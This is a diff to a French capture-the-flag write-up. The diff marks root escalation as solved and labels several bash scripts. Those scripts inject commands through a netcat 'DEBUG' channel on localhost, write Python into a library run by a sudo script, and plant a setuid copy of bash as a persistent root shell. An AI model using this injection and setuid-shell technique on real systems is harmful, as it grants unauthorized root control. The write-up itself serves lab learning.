@@ -17,7 +17,7 @@ Toutefois on a une visu de l'escalade a realiser dans la description de l'applia
 |   3   | wil         | 🕵️  |   ✅  [Clic](./write_up_3.md#c-prendre-le-controle-sur-wil)|
 |   4   | sophie      | 🧠  |   ✅  [Clic](./write_up_3.md#d-prendre-le-controle-sur-sophie)|
 |   5   | ol          | 🛡️  |   ✅  [Clic](./write_up_3.md#e-prendre-le-controle-sur-ol)|
-|   6   | root        | 👑  |   ❌  |
+|   6   | root        | 👑  |   ✅  [Clic](./write_up_3.md#f-escalade-vers-root)  |
 |*bonus*| xavier      |     |   ❌  |
 
 ### RECUPERATION DES `.key_part`
@@ -459,6 +459,7 @@ echo 'DEBUG: echo "#!/bin/bash" > /tmp/test' | nc 127.0.0.1 7042
 
 5. **Definition du fichier de `log`**
 ```bash
+# ./infect_step1.sh
 #!/bin/bash
 
 echo 'DEBUG: echo "LOG=/var/log/hal9042/check.log" >> /tmp/test' | nc 127.0.0.1 7042
@@ -466,6 +467,7 @@ echo 'DEBUG: echo "LOG=/var/log/hal9042/check.log" >> /tmp/test' | nc 127.0.0.1 
 
 6. **Injection du code Python dans `moulai_utils`**
 ```bash
+# ./infect_step2.sh
 #!/bin/bash
 
 echo 'DEBUG: echo "echo \"open('\''/tmp/root_escal.txt'\'','\''w'\'').write('\''created as root'\'')\" > /opt/hal9042/lib/moulai_utils.py" >> /tmp/test' | nc 127.0.0.1 7042
@@ -474,6 +476,7 @@ Resultat : `open('/tmp/root_escal.txt','w').write('created as root')`
 
 7. **Execution de `report.py` avec privileges `sudo`**
 ```bash
+# ./infect_step3.sh
 #!/bin/bash
 
 echo 'DEBUG: echo "sudo /opt/hal9042/scripts/report.py >> \"\$LOG\"" >> /tmp/test' | nc 127.0.0.1 7042
@@ -481,6 +484,7 @@ echo 'DEBUG: echo "sudo /opt/hal9042/scripts/report.py >> \"\$LOG\"" >> /tmp/tes
 
 8. **`/tmp/test` ==> `check.sh`**
 ```bash
+# ./infect_step4.sh
 #!/bin/bash
 
 echo 'DEBUG: echo "$(cat /tmp/test)" > /home/ol/scripts/check.sh' | nc 127.0.0.1 7042
@@ -503,6 +507,7 @@ La creation du fichier prouve que le code injecte dans `moulai_utils.py` a ete e
 11. **Bonus : obtention d'un shell `root` persistant**
 Ayant demontre la vulnerabilite grace au POC de creation de fichier, le plus interessant serait de pouvoir disposer d'un shell interactif persistant. J'ai donc modifie le script d'injection dans `moulai_utils.py` comme suit : 
 ```bash
+# ./infect_step2_bis.sh
 #!/bin/bash
 
 echo 'DEBUG: echo "echo \"import os; os.system('\''cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'\'')\" > /opt/hal9042/lib/moulai_utils.py" >> /tmp/test' | nc 127.0.0.1 7042
